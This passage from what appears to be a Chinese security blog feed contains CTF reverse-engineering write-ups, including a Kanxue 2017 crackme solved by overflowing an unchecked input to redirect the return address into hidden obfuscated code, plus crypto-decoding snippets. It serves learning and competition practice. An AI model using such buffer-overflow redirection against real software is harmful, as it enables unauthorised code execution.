class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div></pre></td><td class="code"><pre><div class="line">int __stdcall sub_434EF0(HWND hDlg, int a2, int a3, int a4)</div><div class="line">&#123;</div><div class="line">  int v4; // ST0C_4@17</div><div class="line">  CHAR *v5; // esi@17</div><div class="line">  int v6; // eax@17</div><div class="line">  int v8; // [sp+0h] [bp-1A4Ch]@18</div><div class="line">  int v9; // [sp+4h] [bp-1A48h]@18</div><div class="line">  int v10; // [sp+8h] [bp-1A44h]@18</div><div class="line">  int v11; // [sp+Ch] [bp-1A40h]@1</div><div class="line">  int i; // [sp+1C4h] [bp-1888h]@14</div><div class="line">  char v13[1032]; // [sp+1D0h] [bp-187Ch]@16</div><div class="line">  char v14[40]; // [sp+5D8h] [bp-1474h]@14</div><div class="line">  int v15; // [sp+600h] [bp-144Ch]@14</div><div class="line">  char v16; // [sp+60Ch] [bp-1440h]@14</div><div class="line">  char v17; // [sp+60Dh] [bp-143Fh]@14</div><div class="line">  char v18; // [sp+A14h] [bp-1038h]@14</div><div class="line">  char v19; // [sp+A15h] [bp-1037h]@14</div><div class="line">  char v20; // [sp+E1Ch] [bp-C30h]@14</div><div class="line">  char v21; // [sp+E1Dh] [bp-C2Fh]@14</div><div class="line">  CHAR String; // [sp+1224h] [bp-828h]@14</div><div class="line">  char v23; // [sp+1225h] [bp-827h]@14</div><div class="line">  int v24; // [sp+162Ch] [bp-420h]@14</div><div class="line">  char v25; // [sp+1638h] [bp-414h]@1</div><div class="line">  char v26; // [sp+1639h] [bp-413h]@1</div><div class="line">  int v27; // [sp+1A40h] [bp-Ch]@1</div><div class="line">  unsigned int v28; // [sp+1A48h] [bp-4h]@1</div><div class="line">  int savedregs; // [sp+1A4Ch] [bp+0h]@1</div><div class="line"></div><div class="line">  memset(&amp;v11, 0xCCu, 0x1A40u);</div><div class="line">  v28 = (unsigned int)&amp;savedregs ^ dword_49B344;</div><div class="line">  v27 = 0;</div><div class="line">  v25 = 0;</div><div class="line">  sub_42D5E6(&amp;v26, 0, 1023);</div><div class="line">  v11 = a2;</div><div class="line">  if ( a2 == 16 )</div><div class="line">    ExitProcess(0);</div><div class="line">  if ( v11 == 272 )</div><div class="line">  &#123;</div><div class="line">    v27 = sub_42D4F1();</div><div class="line">    if ( v27 == 1 )</div><div class="line">      ExitProcess(0);</div><div class="line">    v27 = 0;</div><div class="line">    v27 = sub_42E428();</div><div class="line">    if ( v27 == 1 )</div><div class="line">      ExitProcess(0);</div><div class="line">    v27 = 0;</div><div class="line">    v27 = sub_42D825();</div><div class="line">    if ( v27 == 1 )</div><div class="line">      ExitProcess(0);</div><div class="line">    sub_42D14F(hDlg, 1);</div><div class="line">  &#125;</div><div class="line">  else if ( v11 == 273 )</div><div class="line">  &#123;</div><div class="line">    v11 = (unsigned __int16)a3;</div><div class="line">    if ( (unsigned __int16)a3 == 1002 )</div><div class="line">    &#123;</div><div class="line">      String = 0;</div><div class="line">      sub_42D5E6(&amp;v23, 0, 1023);</div><div class="line">      v20 = 0;</div><div class="line">      sub_42D5E6(&amp;v21, 0, 1023);</div><div class="line">      GetDlgItemTextA(hDlg, 1001, &amp;String, 1025);</div><div class="line">      v24 = sub_42DE51();</div><div class="line">      v18 = 0;</div><div class="line">      sub_42D5E6(&amp;v19, 0, 1023);</div><div class="line">      sub_42D267(&amp;String, 1024, &amp;v20);</div><div class="line">      v16 = 0;</div><div class="line">      sub_42D5E6(&amp;v17, 0, 1023);</div><div class="line">      sub_42D267(&amp;v20, 1024, &amp;v18);</div><div class="line">      sub_42D96A(&amp;v18, &amp;v16, 1024);</div><div class="line">      v15 = 3;</div><div class="line">      sub_42DA78(&amp;v18, 3, v14);</div><div class="line">      for ( i = 0; i &lt; 32; ++i )</div><div class="line">        sub_42DF05(&amp;v13[2 * i], &quot;%02x&quot;, v14[i]);</div><div class="line">      v4 = sub_42D794(v13);</div><div class="line">      v5 = &amp;String + sub_42D794(&amp;String);</div><div class="line">      v6 = sub_42D794(v13);</div><div class="line">      if ( !sub_42DB27(v13, &amp;v5[-v6], v4) )</div><div class="line">      &#123;</div><div class="line">        sub_42D0B4(v8, v9, v10);</div><div class="line">        if ( (unsigned __int8)sub_42D9AB(&amp;unk_49B000, &amp;v16) == 1 )</div><div class="line">        &#123;</div><div class="line">          MessageBoxA(0, &quot;ok&quot;, &quot;CrackMe&quot;, 0);</div><div class="line">          sub_42DE51();</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  sub_42D65E(&amp;savedregs, &amp;dword_435250);</div><div class="line">  sub_42D1E5();</div><div class="line">  return sub_42DE51();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>哇，还是经验太少，这里许多函数看不懂。</p><p>再用OD打开，发现程序有随机化，好烦，f9…出现对话框，按道理这时候可以在读取字符的API下断点，这里是GetDlgItemTextA。然而，我在当前模块中没有找到，后来发现个插件-设置API断点，总算断下来啦。接下来分析算法啦(这是我的能力还是太弱了)。</p><p>借助大神们的wp<br>IDA反汇编关键函数<br><img src="http://ww4.sinaimg.cn/large/006rgqhqly1fl19dym9r5j30xg0jvn5i.jpg" alt=""></p><p>这个直接明文:<br><img src="http://ww2.sinaimg.cn/large/006rgqhqly1fl19irbza0j30xq0cjtef.jpg" alt=""><br>我自己尝试，然而，我来到这个函数，程序执行后就崩溃了<br><img src="http://ww3.sinaimg.cn/large/006rgqhqly1fl19m8qbthj31180ho41f.jpg" alt=""><br>继续分析。</p><p>猜测作者意图<br>1、获取输入 ipt<br>2、两次 base64 解码得到 buf<br>3、自定义解码得到 cmd<br>4、判断 sm3(buf[:3) == ipt[-64:]<br>5、cmd 能在迷宫走到终点</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;去膜拜看雪师傅啦&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>RE——初上看雪</title>
    <link href="http://yoursite.com/2017/10/28/re_kx1/"/>
    <id>http://yoursite.com/2017/10/28/re_kx1/</id>
    <published>2017-10-28T06:57:57.934Z</published>
    <updated>2017-11-09T11:53:40.036Z</updated>
    
    <content type="html"><![CDATA[<p>去膜拜看雪师傅啦<br><a id="more"></a></p><h2 id="1、看雪论坛"><a href="#1、看雪论坛" class="headerlink" title="1、看雪论坛"></a>1、看雪论坛</h2><p>看雪论坛是个软件安全技术交流场所，为安全技术爱好者提供一个技术交流平台和资源。从单一版块『软件调试论坛』，发展到以软件安全技术为主题多个版块的综合论坛。其实这是一个超级大神级别的存在，来膜拜一波</p><h2 id="2、题目"><a href="#2、题目" class="headerlink" title="2、题目"></a>2、题目</h2><p>链接：<a href="http://pan.baidu.com/s/1qXVQmok" target="_blank" rel="external">http://pan.baidu.com/s/1qXVQmok</a> 密码：h5sw<br>去年你已经知道看雪啦，只是不敢去做题，自己太菜了，今年去试一试，第一道题签到题，很开心。然而，第二题，我已经跪啦，不过，在公布wp后，还是学到了许多，这里记录一下学习到的知识。</p><h2 id="3、分析"><a href="#3、分析" class="headerlink" title="3、分析"></a>3、分析</h2><p>一、侦查：无壳 Microsoft Visual C/C++(6.0)[libc]，有明确提示成功和失败信息。<br>二、入坑：OD加载，查找字符，定位到：“You get it!”<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">地址       反汇编                                    文本字符串</div><div class="line">00401000  /$  68 6CB04100   PUSH ctf2017_.0041B06C                   ;  \n Crackme for CTF2017 @Pediy.\n</div><div class="line">00401005  |.  E8 382D0100   CALL ctf2017_.00413D42</div><div class="line">0040100A  |.  83C4 04       ADD ESP,0x4</div><div class="line">0040100D  |.  C705 34B04100&gt;MOV DWORD PTR DS:[0x41B034],0x2          ;  2</div><div class="line">00401017  |.  E8 34000000   CALL ctf2017_.00401050                   ;  input</div><div class="line">0040101C  |.  E8 6F000000   CALL ctf2017_.00401090                   ;  check1</div><div class="line">00401021  |.  E8 BA000000   CALL ctf2017_.004010E0                   ;  check2</div><div class="line">00401026  |.  A1 34B04100   MOV EAX,DWORD PTR DS:[0x41B034]          ;  0</div><div class="line">0040102B  |.  85C0          TEST EAX,EAX</div><div class="line">0040102D  |.  75 10         JNZ Xctf2017_.0040103F</div><div class="line">0040102F  |.  68 5CB04100   PUSH ctf2017_.0041B05C                   ;  You get it!\n</div><div class="line">00401034  |.  E8 092D0100   CALL ctf2017_.00413D42</div><div class="line">00401039  |.  83C4 04       ADD ESP,0x4</div><div class="line">0040103C  |.  33C0          XOR EAX,EAX</div><div class="line">0040103E  |.  C3            RETN</div><div class="line">0040103F  |&gt;  68 38B04100   PUSH ctf2017_.0041B038                   ;  Bad register-code, keep trying.\n</div><div class="line">00401044  |.  E8 F92C0100   CALL ctf2017_.00413D42</div><div class="line">00401049  |.  83C4 04       ADD ESP,0x4</div><div class="line">0040104C  |.  33C0          XOR EAX,EAX</div><div class="line">0040104E  \.  C3            RETN</div><div class="line">0040104F      90            NOP</div><div class="line">00401050  /$  83EC 0C       SUB ESP,0xC</div><div class="line">00401053  |.  68 ACB04100   PUSH ctf2017_.0041B0AC                   ;   Coded by Fpc.\n\n</div><div class="line">00401058  |.  E8 E52C0100   CALL ctf2017_.00413D42</div><div class="line">0040105D  |.  83C4 04       ADD ESP,0x4</div><div class="line">00401060  |.  68 90B04100   PUSH ctf2017_.0041B090                   ;   Please input your code:</div><div class="line">00401065  |.  E8 D82C0100   CALL ctf2017_.00413D42</div><div class="line">0040106A  |.  83C4 04       ADD ESP,0x4</div><div class="line">0040106D  |.  8D4424 00     LEA EAX,DWORD PTR SS:[ESP]</div><div class="line">00401071  |.  50            PUSH EAX</div><div class="line">00401072  |.  68 8CB04100   PUSH ctf2017_.0041B08C                   ;  %s</div><div class="line">00401077  |.  E8 F72C0100   CALL ctf2017_.00413D73</div><div class="line">0040107C  |.  8D4424 08     LEA EAX,DWORD PTR SS:[ESP+0x8]</div><div class="line">00401080  |.  83C4 14       ADD ESP,0x14</div><div class="line">00401083  \.  C3            RETN</div></pre></td></tr></table></figure></p><p>简单跟踪几步发现 401090、4010E0 为显性算法比较，分析 401090、4010E0：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">void check1()</div><div class="line">&#123;</div><div class="line">  int v0; // [sp+4h] [bp-8h]@0</div><div class="line">  int v1; // [sp+8h] [bp-4h]@0</div><div class="line"></div><div class="line">  if ( v1 &amp;&amp; v0 &amp;&amp; v1 != v0 &amp;&amp; 5 * (v1 - v0) + v1 == 0x8F503A42 &amp;&amp; 13 * (v1 - v0) + v0 == 0xEF503A42 )</div><div class="line">    --dword_41B034;</div><div class="line">&#125;</div><div class="line">void check2()</div><div class="line">&#123;</div><div class="line">  int v0; // [sp+4h] [bp-8h]@0</div><div class="line">  int v1; // [sp+8h] [bp-4h]@0</div><div class="line"></div><div class="line">  if ( v1 &amp;&amp; v0 &amp;&amp; v1 != v0 &amp;&amp; 17 * (v1 - v0) + v1 == 0xF3A94883 &amp;&amp; 7 * (v1 - v0) + v0 == 0x33A94883 )</div><div class="line">    --dword_41B034;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p> 把输入每4个字符ASCII作为十六进制赋值计算，假设为a,b则：<br> ⑴：0x5 <em> ( a - b ) + a == 0x8F503A42<br> ⑵：0xD </em> ( a - b ) + b == 0xEF503A42<br> ⑶：0x11 <em> ( a - b ) + a == 0xF3A94883<br> ⑷：0x7 </em> ( a - b ) + b == 0x33A94883<br>然而我分析到这里，感觉只能穷举。。。。结果当然失败了<br>后来看了大佬们的wp，果然学到了许多<br>大佬1：考虑该显性算法未随机打乱数值，低位特征依然继承到计算结果，因此先尝试求解低位，再逐个往高位求解，避免穷举范围过大：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">def solve_false():</div><div class="line">    start_time = time.clock()</div><div class="line">    for a1 in range(0x30,0x7b):</div><div class="line">        for b1 in range(0x30,0x7b):</div><div class="line">            if (0x5 * (a1 - b1) + a1) &amp; 0xff == 0x42:</div><div class="line">                if (0xd * (a1 - b1) + b1) &amp; 0xff == 0x42:</div><div class="line">                    if (0x11 *(a1 - b1) + a1) &amp; 0xff == 0x83:</div><div class="line">                        if (0x7 * (a1 - b1) + b1) &amp; 0xff == 0x83:</div><div class="line">                            print (&quot;found sn a1 : %x&quot; % a1)</div><div class="line">                            print (&quot;found sn b1 : %x&quot; % b1)</div><div class="line">    print (&apos;use time: %.3f second&apos; % (time.clock()-start_time))</div><div class="line">    return</div></pre></td></tr></table></figure></p><p>迅速识别该方程组无合法答案，无疑是作者埋的坑，立即寻找其他途径。<br>大佬2:z3识别改方程组无解（这里我还是没有懂，z3太强大啦）<br>大佬3：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">0x11 * ( a - b ) + a == 0xF3A94883</div><div class="line">0x5 * ( a - b ) + a == 0x8F503A42</div></pre></td></tr></table></figure></p><p>推出:<br><code>12 * ( a - b ) == 0x64590d41</code><br>右边为偶数，左边为奇数，无解</p><p>这道题由于没有判断输入长度，便存在溢出（这里我完全没有想打RE，还有溢出，涨知识了），那溢出到哪里呢？,大佬们发现0x00413131存在shellcode编码（膜拜），溢出到这里<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">.text:0040112B                 db 5 dup(90h)</div><div class="line">.text:00401130                 dd 4800h dup(0)</div><div class="line">.text:00413130 ; ---------------------------------------------------------------------------</div><div class="line">.text:00413130                 retn</div><div class="line">.text:00413130 ; ---------------------------------------------------------------------------</div><div class="line">.text:00413131                 db 83h, 0C4h, 0F0h</div><div class="line">.text:00413134                 dd 20712A70h, 0F1C75F2h, 28741C71h, 2E0671DDh, 870F574h</div><div class="line">.text:00413134                 dd 74F17169h, 0DC167002h, 0EA74C033h, 0DC261275h, 0F471E771h</div><div class="line">.text:00413134                 dd 6903740Fh, 0EB75EB70h, 0FDF7069h, 22712C70h, 0B8261F7Dh</div><div class="line">.text:00413134                 dd 2B741E71h, 3E067169h, 870F57Ch, 7CF17169h, 0DC197002h</div><div class="line">.text:00413134                 dd 41B034A3h, 75E77400h, 0E571DC12h, 7CDCF271h, 0E9706903h</div><div class="line">.text:00413134                 dd 6965E97Dh, 70B8DC70h, 3E1D7127h, 710F1971h, 0DD257019h</div><div class="line">.text:00413134                 dd 0F6700571h, 71DD0870h, 700270F2h, 70580F14h, 0F1171ECh</div><div class="line">.text:00413134                 dd 0F671EA71h, 0DD03700Fh, 0ED71ED70h, 0FE170DDh, 7F36217Eh</div><div class="line">.text:00413134                 dd 671A7D27h, 1D2A74B8h, 65690D7Eh, 67C067Fh, 1D361C7Eh</div><div class="line">.text:00413134                 dd 8BDC0E7Fh, 75EA74C8h, 7E69DC14h, 0C1F47FEFh, 0F97CFB7Fh</div><div class="line">.text:00413134                 dd 0EA7DE27Fh, 0D87E6965h, 772076B8h, 2E1A7F27h, 0DD2978B8h</div><div class="line">.text:00413134                 dd 778D0D76h, 67EF207h, 0DD261B76h, 58B80E77h, 1479EB78h</div><div class="line">.text:00413134                 dd 768DB865h, 0FF477EFh, 0F97EFB77h, 0EA7FE177h, 0B8D9768Dh</div><div class="line">.text:00413134                 dd 73F22372h, 1C756729h, 0DD2C740Fh, 66690E72h, 6740673h</div><div class="line">.text:00413134                 dd 0DD361E72h, 0DD261073h, 0E974D88Bh, 12751575h, 73ED72DCh</div><div class="line">.text:00413134                 dd 0FB730FF3h, 0E073F974h, 6966E875h, 740FD672h, 2E1D7527h</div><div class="line">.text:00413134                 dd 75DC1973h, 0DD267C19h, 742E0475h, 0F3751D08h, 16740272h</div><div class="line">.text:00413134                 dd 0ED7C58C1h, 0C1F3137Dh, 0F575EA75h, 1D03720Fh, 0EC73EC74h</div><div class="line">.text:00413134                 dd 0DF741D66h, 0F23EBDCh, 0EB227585h, 85261DFAh, 74D08B29h</div><div class="line">.text:00413134                 dd 0EBF6EB18h, 75D08BF4h, 32F2EBECh, 0E9754A3Eh, 6256F2EBh</div><div class="line">.text:00413134                 dd 0EDEB7A6Eh, 7D267C7Ah, 187DF21Ch, 70187D0Fh, 37D1D25h</div><div class="line">.text:00413134                 dd 7D69087Ch, 7C027CF4h, 0C18BDC16h, 1271ED70h, 7DEB7DDCh</div><div class="line">.text:00413134                 dd 37CC1F5h, 7DEC7C69h, 7C6966ECh, 2A780FDFh, 793E2079h</div><div class="line">.text:00413134                 dd 1C79B81Ch, 798D2874h, 0F5783606h, 79DD0878h, 780278F1h</div><div class="line">.text:00413134                 dd 0C32B0F16h, 1275EA74h, 0E7790F2Eh, 78B8F479h, 0EB78DD03h</div><div class="line">.text:00413134                 dd 78DDEB79h, 2B70B8DFh, 79662271h, 1E71C11Eh, 71692A70h</div><div class="line">.text:00413134                 dd 70F67805h, 0F271DD08h, 19700278h, 2E0C10Fh, 1471EA70h</div><div class="line">.text:00413134                 dd 0F107966h, 0F171E571h, 700278DCh, 36E979E9h, 0C1DC70DDh</div><div class="line">.text:00413134                 dd 22712B70h, 0B81E7326h, 29781E71h, 571DD3Eh, 870F572h</div><div class="line">.text:00413134                 dd 72F1711Dh, 0C1177002h, 0EA78C103h, 733E1379h, 0E671C10Fh</div></pre></td></tr></table></figure></p><p>那溢出长度是多少呢？输入aaaabbbbccccddddeeee,发现返回地址是dddd,<br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fkxzsu500uj31440g1q7v.jpg" alt=""><br>再次输入aaaabbbbccc11A<br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fkxzvguj53j31h20guady.jpg" alt=""><br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fkxzw6hh09j319v08rabc.jpg" alt=""><br>黑色，这里右键-分析-从模块删除分析<br><img src="http://ww1.sinaimg.cn/large/006rgqhqgy1fkxzzfg35gj31ah0bwgod.jpg" alt=""><br>这里出现花指令(代码混淆，花指令不影响程序运行。就是看耐心。就拿这个题目来说。花指令就是跳来跳去。可以脱去，其实不脱话也一样的)<br><img src="http://ww1.sinaimg.cn/large/006rgqhqgy1fky059od5wj30k309zq4f.jpg" alt=""><br>一步一步分析<br>在0x413131位置设置新断点，回车断下，忽略花指令，仅摘录算法相关代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">00413131    83C4 F0         add esp,-0x10</div><div class="line">00413150    33C0            xor eax,eax</div><div class="line">00413184    A3 34B04100     mov dword ptr ds:[0x41B034],eax </div><div class="line">004131BA    58              pop eax          //aaaa</div><div class="line">004131EB    8BC8            mov ecx,eax</div><div class="line">0041321F    58              pop eax     //bbbb</div><div class="line">00413254    8BD8            mov ebx,eax</div><div class="line">00413289    58              pop eax   //cccc</div><div class="line">004132B5    8BD0            mov edx,eax</div><div class="line">004132AD    8BD0            mov edx,eax</div><div class="line">004132E2    8BC1            mov eax,ecx  //eax=aaaa</div><div class="line">00413316    2BC3            sub eax,ebx   //ebx=bbbb eax=a-b</div><div class="line">00413349    C1E0 02         shl eax,0x2    //(a-b)*4</div><div class="line">00413380    03C1            add eax,ecx     //(a-b)*4+a</div><div class="line">004133B5    03C2            add eax,edx     //(a-b)*4+a+c</div><div class="line">004133E9    2D E217F9EA     sub eax,0xEAF917E2   ///0xEAF917E2==((a-b)*4+a+c)</div><div class="line"></div><div class="line">00413B1E    58              pop eax                ; ctf2017_.00413E3E</div><div class="line">00413B4E    35 0E210100     xor eax,0x1210E</div><div class="line">00413B83    3305 34B04100   xor eax,dword ptr ds:[0x41B034]</div><div class="line">0040103F    68 38B04100     push ctf2017_.0041B038         &quot;Bad register-code&quot;</div><div class="line"></div><div class="line">00413455    03C1            add eax,ecx     //ecx=aaaa</div><div class="line">00413489    2BC3            sub eax,ebx    //ebx=bbbb</div><div class="line">004134BF    8BD8            mov ebx,eax    //ebx=eax=a-b</div><div class="line">004134F3    D1E0            shl eax,1   //(a-b)*2</div><div class="line">00413525    03C3            add eax,ebx  //(a-b)*3</div><div class="line">00413559    03C1            add eax,ecx   //(a-b)*3+a</div><div class="line">0041358F    8BC8            mov ecx,eax //</div><div class="line">004135C3    03C2            add eax,edx   //(a-b)*3+a+c</div><div class="line">004135F7    2D C808F5E8     sub eax,0xE8F508C8 //(a-b)*3+a+c==0xE8F508C8</div><div class="line"></div><div class="line">00413665    8BC1            mov eax,ecx</div><div class="line">0041365D    8BC1            mov eax,ecx //(a-b)*3+a</div><div class="line">004136A7    2BC2            sub eax,edx  //(a-b)*3+a-c</div><div class="line">004136D8    2D 683C0A0C     sub eax,0xC0A3C68 // (a-b)*3+a-c==0xC0A3C68</div></pre></td></tr></table></figure></p><p>求解<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">(a-b)*3+a-c==0xC0A3C68</div><div class="line">(a-b)*3+a+c==0xE8F508C8</div><div class="line">(a-b)*4+a+c==0xEAF917E2</div></pre></td></tr></table></figure></p><p>以参考了许多大神的代码<br>学到了一种解决方程的方法，贼好用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">from sympy import *</div><div class="line">a=Symbol(&apos;a&apos;)</div><div class="line">b=Symbol(&apos;b&apos;)</div><div class="line">c=Symbol(&apos;c&apos;)</div><div class="line">print (solve([(a-b)*3+a-c-0xC0A3C68,(a-b)*3+a+c-0xE8F508C8,(a-b)*4+a+c-0xEAF917E2],[a,b,c]))</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;去膜拜看雪师傅啦&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CTF中的解密</title>
    <link href="http://yoursite.com/2017/10/23/misc_mima/"/>
    <id>http://yoursite.com/2017/10/23/misc_mima/</id>
    <published>2017-10-23T11:35:11.729Z</published>
    <updated>2017-11-09T11:38:37.032Z</updated>
    
    <content type="html"><![CDATA[<p>ctf必备解密网站<br><a id="more"></a></p><h2 id="1、密码"><a href="#1、密码" class="headerlink" title="1、密码"></a>1、密码</h2><p>维吉尼亚<br><a href="https://www.guballa.de/vigenere-solver" target="_blank" rel="external">https://www.guballa.de/vigenere-solver</a><br>brainfuck密码<br><a href="https://www.nayuki.io/page/brainfuck-interpreter-javascript" target="_blank" rel="external">https://www.nayuki.io/page/brainfuck-interpreter-javascript</a><br>md5<br><a href="http://www.dmd5.com/" target="_blank" rel="external">http://www.dmd5.com/</a><br>生成二维码<br><a href="http://tool.chinaz.com/qrcode" target="_blank" rel="external">http://tool.chinaz.com/qrcode</a><br>词频分析<br><a href="https://quipqiup.com/" target="_blank" rel="external">https://quipqiup.com/</a><br>libc库查询<br><a href="http://libcdb.com/" target="_blank" rel="external">http://libcdb.com/</a><br>栅栏密码<br><a href="http://www.qqxiuzi.cn/bianma/zhalanmima.php" target="_blank" rel="external">http://www.qqxiuzi.cn/bianma/zhalanmima.php</a><br>解密代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">char s[]= &quot;tn c0afsiwal kes,hwit1r  g,npt  ttessfu&#125;ua u  hmqik e &#123;m,  n huiouosarwCniibecesnren.&quot;;  </div><div class="line">char t[86]= &quot;&quot;;  </div><div class="line">int i,j,k;</div><div class="line">k=0;</div><div class="line">for (i=0;i&lt;17;i++)  </div><div class="line">&#123;  </div><div class="line">      for(j=0;j&lt;5;j++)  </div><div class="line">      &#123;  </div><div class="line">                t[k++]= ch[j*17+i];  </div><div class="line">      &#125;  </div><div class="line">&#125;  </div><div class="line">for(i=0;i&lt;85;i++)</div><div class="line">&#123;</div><div class="line">    printf(&quot;%c&quot;,t[i]);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>当铺密码<br>王夫 井工 夫口 由中人 井中 夫夫 由中大：67 84 70 123 82 77 125<br>凯撒密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python </div><div class="line"># -*- coding: utf-8 -*-</div><div class="line">__author__ = &apos;ByStudent&apos;</div><div class="line">lstr=&quot;&quot;&quot;U8Y]:8KdJHTXRI&gt;XU#?!K_ecJH]kJG*bRH7YJH7YSH]*=93dVZ3^S8*$:8&quot;&amp;:9U]RH;g=8Y!U92&apos;=j*$KH]ZSj&amp;[S#!gU#*dK9\.&quot;&quot;&quot;</div><div class="line">for p in range(127):</div><div class="line">    str1 = &apos;&apos;</div><div class="line">    for i in lstr:</div><div class="line">        temp = chr((ord(i)+p)%127)</div><div class="line">        if 32&lt;ord(temp)&lt;127 :</div><div class="line">            str1 = str1 + temp</div><div class="line">            feel = 1</div><div class="line">        else:</div><div class="line">             feel = 0</div><div class="line">             break</div><div class="line">    if feel == 1:</div><div class="line">         print(str1)</div></pre></td></tr></table></figure></p><p>莫斯密码<br><a href="http://www.jb51.net/tools/morse.htm" target="_blank" rel="external">http://www.jb51.net/tools/morse.htm</a><br>希尔密码<br>密文： 22,09,00,12,03,01,10,03,04,08,01,17 （明文：wjamdbkdeibr）<br>解题思路：使用的矩阵是 1 2 3 4 5 6 7 8 10<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div 